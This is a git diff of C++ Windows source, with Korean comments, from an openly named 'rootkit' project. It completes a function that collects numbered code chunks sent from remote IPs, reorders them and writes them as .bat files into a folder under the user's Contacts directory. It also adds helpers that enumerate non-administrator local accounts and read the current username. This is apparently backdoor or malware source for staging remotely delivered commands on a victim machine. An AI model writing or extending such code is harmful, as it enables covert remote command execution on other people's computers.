@@ -3,12 +3,16 @@
 #define NODRAWTEXT      // DrawText()와 DT_* 매크로 제외
 #define NOGDI           // GDI 기능을 제외 (폰트, 비트맵 등 안 쓸 때)
 #define NOKANJI         // 한자 지원 제외
+#ifndef UNLEN
+#define UNLEN 256
+#endif
 #include <windows.h>
 #include <lm.h>
 
 #pragma comment(lib, "netapi32.lib")
 
 #include <iostream>
+#include <fstream>
 #include <cstdio>  
 #include <string>
 #include <memory>
@@ -18,6 +22,10 @@
 #include <unordered_map>
 #include <filesystem>
 #include <algorithm>
+
+
+#include "rootkit.hpp"
+#include "picosha2.h"
 
 namespace fs = std::filesystem;
 
@@ -48,10 +56,36 @@ bool is_numeric(const std::string& s) {
 	}
 }
 
+Queue* find_queue_by_ip(std::vector<Queue>& list, const std::string& ip) {
+	auto it = std::find_if(list.begin(), list.end(), [&](const Queue& q) {
+		return q.ip == ip;
+		});
+
+	if (it != list.end()) {
+		return &(*it);
+	}
+	return nullptr;
+}
+
+std::wstring convert_to_wide(const std::string& str) {
+	if (str.empty()) return std::wstring();
+	int sizeNeeded = MultiByteToWideChar(CP_ACP, 0, &str[0], static_cast<int>(str.size()), nullptr, 0);
+	std::wstring wstrTo(sizeNeeded, 0);
+	MultiByteToWideChar(CP_ACP, 0, &str[0], static_cast<int>(str.size()), &wstrTo[0], sizeNeeded);
+	return wstrTo;
+}
+std::string wchar_convert_to_string(const WCHAR* wcharStr) {
+	int sizeNeeded = WideCharToMultiByte(CP_UTF8, 0, wcharStr, -1, nullptr, 0, nullptr, nullptr);
+	std::string strTo(sizeNeeded - 1, 0);
+	WideCharToMultiByte(CP_UTF8, 0, wcharStr, -1, &strTo[0], sizeNeeded, nullptr, nullptr);
+	return strTo;
+}
+
 namespace rootkit {
 	// Forward Declaration
 	std::vector<std::string> get_username_list();
-
+	std::vector<std::string> get_username_list_not_admin();
+	std::string get_program_host_username();
 
 	std::vector<Queue> queueLists;
 	std::unordered_map<std::string, std::vector<Code>> codes;
@@ -90,18 +124,13 @@ namespace rootkit {
 				isFirstSpaceCounted = true;
 				continue;
 			}
-			
+
 			if (isFirstSpaceCounted) postfix += cmd[i];
 		}
 		return postfix;
 	}
 
-	
-	// first = 변환된 문자열(명령어 부분만 추출한), second = 성공/실패 여부
-	// second가 false일시 first는 항상 ""이 됨
-	// second가 nullptr일시 앞에 패키지가 손실됨을 의미함
-	// second가 nullptr이어도 first는 항상 ""이 됨
-	std::pair<std::string, std::variant<bool, nullptr_t>> exploit_bat_formatter(std::string& ip, unsigned short port, const std::string& str) {
+	FormatResult exploit_bat_formatter(std::string& ip, unsigned short port, const std::string& str) {
 		// 앞 4자리는 순서 번호
 		// 바로 다음 한자리 숫자는 종료 플래그(0 = 계속 전송중, 1 = 종료 플래그)
 		// 뒤는 데이터
@@ -109,35 +138,62 @@ namespace rootkit {
 		// ip랑 포트번호를 어떻게 구함?
 		// 내가 직접 넘겨줘야하나...
 
-
 		std::string headerAll = str.substr(0, 5);
 		if (!is_numeric(headerAll)) {
-			return { "", false };
+			return { "", FormatStatus::Failed };
 		}
 		std::string headerOrderNumber = headerAll.substr(0, 4);
 		std::string headerFlag = headerAll.substr(4);
 		int headerOrderNumber_i = std::stoi(headerOrderNumber);
 		int headerFlag_i = std::stoi(headerFlag);
 		if (headerFlag_i != 1 && headerFlag_i != 0) {
-			return { "", false };
+			return { "", FormatStatus::Failed };
 		}
 		// 코드(데이터) 파싱
 		std::string code = str.substr(5);
 
-		std::vector<std::string> userList = rootkit::get_username_list();
-		std::sort(userList.begin(), userList.end());
-		std::string dir = "C:/Users/" + userList[0] + "Contacts/port";
+		std::string username = get_program_host_username();
+		if (username.empty()) {
+			throw std::runtime_error("username 가져오기 실패");
+		}
+		std::string dir = "C:/Users/" + username + "/Contacts/port";
 
 		// 이미 Queue에 등록되어 있는 경우
 		if (codes.count(ip)) {
-			bool headerFlag_b = (headerFlag_i == 1) ? true : false;
+			bool headerFlag_b = headerFlag_i;
 			// 송신 종료 플래그 == true
 			if (headerFlag_b == true) {
 				// 작성 필요
+				// 마지막 코드 추가
+				codes[ip].emplace_back(headerOrderNumber_i, code);
+				// 먼저 정렬부터
+				std::sort(codes[ip].begin(), codes[ip].end(), [&](const Code& a, const Code& b) {
+					return a.line < b.line;
+					});
+
+				const std::string fileName = dir + "/" + picosha2::hash256_hex_string(ip) + ".bat";
+				// 그 다음 파일로 만들기
+				std::ofstream batchFile(fileName);
+
+				if (batchFile.is_open()) {
+					for (const Code& c : codes[ip]) {
+						std::string code = c.code;
+						batchFile << code << "\n";
+					}
+					batchFile.close();
+					codes[ip].clear();
+					return { "[LAST CODE SUCCESSFULY SAVED]", FormatStatus::Success };
+				}
+				return { "", FormatStatus::Failed };
+
 			}
 			// 송신 종료 플래그 == false
 			else {
-				// 작성 필요
+				// early return if - headerOrderNumber_i - 1 = lastOrderNum인가? (손실 없이 순서대로 왔는지)
+				Queue* queue = find_queue_by_ip(queueLists, ip);
+				if (queue->lastOrderNum != headerOrderNumber_i - 1) return { "", FormatStatus::Lost };
+				codes[ip].emplace_back(headerOrderNumber_i, code);
+				return { code, FormatStatus::Success };
 			}
 		}
 		// 처음 연결, 혹은 Queue에 등록되어 있지 않은 경우
@@ -146,22 +202,32 @@ namespace rootkit {
 			if (headerFlag_b == true) {
 				// 처음 메세지가 전송 끝이면 거절 장난하자는거야 뭐야;;
 				// 한줄만 쓸꺼면 exploit을 쓰세요 제발;;
-				return { "", false };
+				return { "", FormatStatus::Failed };
+			}
+			if (headerOrderNumber_i != 1) {
+				return { "", FormatStatus::Failed };
 			}
 			Queue queue;
 			queue.listening = true;
 			queue.lastOrderNum = headerOrderNumber_i;
 			queue.ip = ip;
 			queue.port = port;
-			queueLists.push_back(queue);
-			codes.try_emplace(ip);	
+			queueLists.emplace_back(queue);
+			codes.try_emplace(ip);
 			codes[ip].emplace_back(headerOrderNumber_i, code);
 			// 설마 여기까지 왔는데 true겠어
 			// 하지만 믿으면 안되지 검증은 필수
 			if (queue.directoryCreated == false) {
-				fs::create_directories(dir);
-				queue.directoryCreated = true;
+				try {
+					fs::create_directories(dir);
+					queue.directoryCreated = true;
+				}
+				catch (const fs::filesystem_error& e) {
+					std::cerr << "에러 메세지: " << e.what() << std::endl;
+					std::cerr << "관련 경로 1: " << e.path1() << std::endl;
+				}
 			}
+			return { code, FormatStatus::Success };
 		}
 	}
 
@@ -190,5 +256,50 @@ namespace rootkit {
 		}
 
 		return user_list;
+	}
+
+	std::vector<std::string> get_username_list_not_admin() {
+		std::vector<std::string> adminList = rootkit::get_username_list();
+		for (auto user : adminList) {
+			std::cout << user << std::endl;
+		}
+		std::vector<std::string> nonAdminList;
+		for (auto username_s : adminList) {
+			std::wstring username_ws = convert_to_wide(username_s);
+			LPCWSTR username = username_ws.c_str();
+			LPLOCALGROUP_USERS_INFO_0 pGroupBuf = nullptr;
+			DWORD entriesRead = 0, totalEntries = 0;
+
+			NET_API_STATUS nStatus = NetUserGetLocalGroups(nullptr, username, 0, LG_INCLUDE_INDIRECT, reinterpret_cast<LPBYTE*>(&pGroupBuf), MAX_PREFERRED_LENGTH, &entriesRead, &totalEntries);
+
+			bool isAdmin = false;
+			if (nStatus == NERR_Success) {
+				for (DWORD i = 0; i < entriesRead; i++) {
+					if (wcscmp(pGroupBuf[i].lgrui0_name, L"Administrators") == 0) {
+						isAdmin = true;
+						break;
+					}
+				}
+			}
+			if (isAdmin) {
+				if (pGroupBuf != nullptr) NetApiBufferFree(pGroupBuf);
+				continue;
+			}
+			nonAdminList.push_back(username_s);
+			if (pGroupBuf != nullptr) NetApiBufferFree(pGroupBuf);
+		}
+		return nonAdminList;
+	}
+
+	std::string get_program_host_username() {
+		TCHAR name[UNLEN + 1];
+		DWORD size = UNLEN + 1;
+
+		if (GetUserName(name, &size)) {
+			return wchar_convert_to_string(name);
+		}
+		else {
+			return "";
+		}
 	}
 }
